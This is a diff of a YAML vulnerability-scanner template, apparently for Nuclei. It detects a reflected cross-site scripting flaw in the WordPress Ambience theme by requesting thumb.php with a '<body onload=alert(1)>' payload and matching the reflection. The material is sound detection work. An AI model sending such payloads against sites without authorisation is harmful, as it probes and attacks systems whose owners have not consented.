@@ -1,5 +1,4 @@
 id: wp-ambience-xss
-
 info:
   name: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
   author: daffainfo
@@ -7,46 +6,40 @@ info:
   description: |
     WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.
   reference:
-    - https://www.exploit-db.com/expl oits/38568
     - https://wpscan.com/vulnerability/c465e5c1-fe43-40e9-894a-97b8ac462381
+    - https://www.exploit-db.com/exploits/38568
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 5.4
     cwe-id: CWE-80
   metadata:
     max-request: 2
-  tags: wp-plugin,wp,edb,wpscan,wordpress,xss,vuln
-
+  tags: edb,vuln,wordpress,wp,wp-plugin,wpscan,xss
 flow: http(1) && http(2)
-
 http:
-  - method: GET
+  - matchers:
+      - internal: true
+        type: word
+        words:
+          - /wp-content/themes/ambience/
+    method: GET
     path:
       - '{{BaseURL}}'
-
-    matchers:
-      - type: word
-        internal: true
+  - matchers:
+      - part: body
+        type: word
         words:
-          - '/wp-content/themes/ambience/'
-
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "<body onload=alert(1)>"
-
-      - type: word
-        part: header
+          - <body onload=alert(1)>
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
+        # digest: 490a0046304402201edd5a409546ed13f046ce7a230242b819f7a9f9ffc4ea70f59310f4ccd56e7b022072f9180693861822a3260ef9eca8439af6efa0d06ab3c8ab9fb597a4c9bc5d2e:922c64590222798bb761d5b6d8e72950
 
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
